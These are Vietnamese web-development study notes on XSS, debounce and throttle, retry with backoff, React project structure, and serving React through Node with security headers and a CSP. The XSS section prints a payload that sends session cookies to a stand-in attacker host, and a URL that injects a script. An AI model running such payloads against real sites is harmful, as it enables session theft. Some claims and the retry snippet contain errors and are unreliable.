# XSS
->*** Cách tránh khi input của người dùng hiển thị trên UI:
- Dùng textContent thay vì innerHTML là xong. innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML, k nên dùng. 
- Input nhét vào url phải dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước là xong.

-> Reflected XSS: User login web có session cookies -> Hacker gửi 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.

-> Stored XSS: Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy data từ db có đoạn XSS script về thực thi là toang

-> DOM Based XSS: giống reflected XSS nhưng 1 cái gửi lên server, 1 cái sửa DOM
Hacker lừa người dùng truy cập vào URL của 1 trang web để đăng nhập là: http://example.com/register.php?message=Please fill in the form
Nhưng hacker lại gửi: http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select> <script>function show(){alert("hacked");}</script>
=> Dòng please fill in the form biến thành 1 input gender vì browser nó render html như v, khi người dùng kb vào chọn gender thì script được thực thi



# Dùng debounce throttle
Debounce trigger liên tục mãi mãi sẽ kbh chạy hàm, throttle đảm bảo hàm chạy luôn lần sau trigger cách lần trước đủ tg sẽ đảm bảo chạy tiếp.

-> throttle: Giới hạn số lần gọi hàm trong 1 ktg. VD ta có thể set là "Bất cứ 10s liên tiếp nào cũng k có quá 1 lần gọi hàm này"
VD: thg dung trong game khi người dùng ấn bắn chiêu nhanh đến mấy thì vẫn bắn 1s 1 phát đạn chẳng hạn
function throttle(func, delay) {
  let lastCallTime = 0;
  return function (...args) {
    const currentTime = Date.now();
    if (currentTime - lastCallTime >= delay) {
      lastCallTime = currentTime;
      func.apply(this, args);
    }
  };
}
const throttledFunction = throttle(() => {
  console.log('Function throttled!');
}, 500);
throttledFunction();

-> debounce: trigger sẽ k thực hiện ngay mà delay 1 ktg kể từ lần cuối cùng hàm được gọi.
VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng debounce cho đỡ lag
VD: tính năng search khi gõ liên tục sẽ chỉ tự thực hiện sau khi gõ xong
function debounce(func, delay) {
  let timeoutId;
  return function (...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      func.apply(this, args);
    }, delay);
  };
}
const debouncedFunction = debounce(() => {
  console.log('Function debounced!');
}, 500);
debouncedFunction();



# Tạo safe triangle cho context menu
Giải thích: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
Cơ chế xử lý sự kiện mouse enter và mouse leave. Mỗi khi move sẽ check vị trí mouse trong hình tam giác cũ thì tạo tam giác mới, ngoài hình tam giác cũ thì disable pointer-event là xong.
Có thể implement thêm safe triangle thì chuột bị di chậm hoặc đứng yên cũng tự tắt.



# Dùng retryable
BE nên dùng retryable khi call api qtr và db, đặc biệt là call by batch.
BE call tới db cũng nên tận dùng transaction để gom batch update 1 lần.
FE ít khi dùng retryable vì ít khi lỗi mạng, mà nếu lỗi thì call lại cũng khó thành công, thường sẽ show lỗi cho người dùng. FE chỉ nên dùng cho các API quan trọng gọi tới bên thứ 3, khi polling liên tục, khi dùng socket muốn reconnect khi mất kết nối. 
FE retryable thường triển khai qua interceptors của axios.

Nên giới hạn retry 3s max 5 lần. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế.
Giải pháp là cộng thêm 1 số random ở mỗi lần để sleep. Chưa tốt vì ktg ngắn thì xs lặp lại lỗi cũ cao, phải dùng exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. VD khi nhập mật khẩu, nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.

VD càng sai càng chờ lâu, liên tục trong 3 lần, cộng 1 khoảng random từ 0->1s:
static async fetchWithRetry(url, errorCount = 0) => {
  const ERROR_COUNT_MAX = 3;
  const response = await fetch(url);
  if(response.status < 200 || response.status >= 300) { // Chỉ lỗi mạng mới retry
    // Log lỗi 
    if(errorCount < ERROR_COUNT_MAX){
      await new Promise(r => setTimeout(r, Math.pow(2, errorCount)*3000 + Math.random()*1000));
      await this.fetchWithRetry(url, errorCount + 1);
    }
  }
}



# Chia cấu trúc dự án lớn
Quan trọng là nhìn vào giao diện biết tìm ở file nào, nhìn vào file nào biết nằm ở đâu trên giao diện. 1 người mới toanh nhìn vào là hiểu luôn.
VD ta cần tìm trong trang finance, trong 1 mục X, có cái dropdown => Phải tìm trong pages/finance/X/index.js. Dropdown là 1 component chung nhưng chỉ dùng ở finance thì nên chia kiểu src/common/finance/dropdown/index.js hoặc src/apps/finance/common/dropdown/index.js

VD chuẩn là chia theo chức năng, mỗi chức năng sẽ chia theo cấu trúc từng module UI:
src (folder)
  api (folder)
    calling (folder) => call API cho calling
    powerplatform (folder) => call API cho powerplatform
    helpers (folder) => enum, utility liên quan tới API
  app (folder)
    common (folder) => common component
    structure (folder) => component kiểu loading, error, headers, router => chức năng
    pages (folder) => chức năng
      calling (folder) => module UI
        common (folder) => common components của calling
        callingpolicy => component trong calling policy. Chia theo cấu trúc UI
        callqueues => component trong callqueues
      powerplatform (folder)
    index.js
    index.css
  redux (folder)
    actions (folder)
      calling
      powerplatforms 
    reducers (folder)
      calling
      powerplatforms
    store (folder)
  hookes (folder)
    react-query (folder)
    contracts (folder)
    common (folders)
  util (folder) => chứa các utility chung
  model (folder) => chứa interface, type, struct
  context (folder)
  index.html
  index.js
=> Với dự án nhỏ thì có thể k cần chia folder lớn cho từng module như v mà chỉ có 1 file, thì file nên có tên module để nhìn phát biết dùng cho module nào, hoặc viết 1 file common dùng cho mọi module.
Trong 1 file component có: propsType  defaultProps  utilities  Component



//!!!!!!!
# Dựng server nodejs serve react app
Giả sử công ty lớn cần thêm các header bảo mật khi người dùng vào web react, có thể dựng 1 server nodejs custom để serve.
Đầu tiên build app react set outDir ra 1 thư mục có file index.html -> dựng 1 server expressjs config route để serve file index.html đó -> Tuỳ ý tạo middleware thêm các header bảo mật. Có thể tạo các biến số trong file index.html để thế vào từ server, VD các url phân tách môi trường, SSL key, login SSO -> thay lệnh chạy react bằng lệnh chạy nodejs.
Server này thế cho nginx cũng được, thực tế việc set header có thể làm ở nginx.
Chú ý họ chỉ cần thêm header bảo mật của request lấy file index.html, VD k cho web khác nhúng web của ta vào iframe. Còn các API query data thì k cần, API đó có access token bảo mật riêng klq. Khi ta set header cho query GET index.html, browser lấy xong index.html này sẽ lấy các file js, css liên quan thì sẽ tự thêm các header cũ

Các công ty lớn bảo mật cao thường k phụ thuộc vào bên thứ 3. Header họ set rất chi tiết chứ k dùng thư viện helmet đâu. VD: 
res.setHeader('Content-Security-Policy', "frame-ancestors 'self'; frame-src 'self' https://*.youtube.com; base-uri 'none'; object-src 'none'; img-src data: 'self' https://* *.aptrinsic.com  *.segment.com *.segment.io *.avepointonlineservices.com *.avepoint.com storage.googleapis.com; form-action 'self' *.sharepointguild.com *.avepointonlineservices.com *.sharepointonline.com *.online15.net *.avepointonlineservices.apps.mil; script-src 'self'" + ' \'nonce-' + req.nonce + '\'' + " *.sharepointguild.com *.avepointonlineservices.com *.sharepointonline.com *.online15.net *.aptrinsic.com *.segment.com *.segment.io *.avepointonlineservices.apps.mil; connect-src  *.sharepointguild.com *.avepointonlineservices.com *.online15.net *.aptrinsic.com *.segment.com *.segment.io *.avepointonlineservices.apps.mil 'self'");
Giải thích CSP:
frame-ancestors 'self': Chỉ cho phép trang này được nhúng trong iframe từ cùng một nguồn (origin). Điều này ngăn chặn việc nhúng trang vào các trang web độc hại.
frame-src 'self' https://.youtube.com: Cho phép nhúng các iframe từ cùng một nguồn và từ các miền con của youtube.com.
base-uri 'none': Ngăn chặn việc sử dụng thẻ <base> trong tài liệu, giúp giảm thiểu rủi ro từ các cuộc tấn công.
object-src 'none': Ngăn chặn việc sử dụng thẻ <object>, <embed>, và <applet>, giúp bảo vệ khỏi các lỗ hổng liên quan đến các đối tượng nhúng.
img-src data: 'self' https:// .aptrinsic.com .segment.com .segment.io: Cho phép tải hình ảnh từ cùng một nguồn, từ các miền cụ thể.
form-action 'self' .online15.net: Chỉ định các nguồn mà biểu mẫu có thể gửi dữ liệu đến.
script-src 'self' 'nonce-{req.nonce}' .online15.net .aptrinsic.com: Cho phép chạy script từ cùng một nguồn và từ các miền cụ thể, với điều kiện rằng script có nonce (một giá trị duy nhất cho mỗi yêu cầu) để ngăn chặn việc chèn script độc hại. Thẻ script trong dự án phải có thêm trường nonce
connect-src .sharepointguild.com .online15.net .aptrinsic.com .segment.com .segment.io 'self': Chỉ định các nguồn mà trang có thể thực hiện các kết nối (như WebSocket, AJAX).

upgrade-insecure-requests
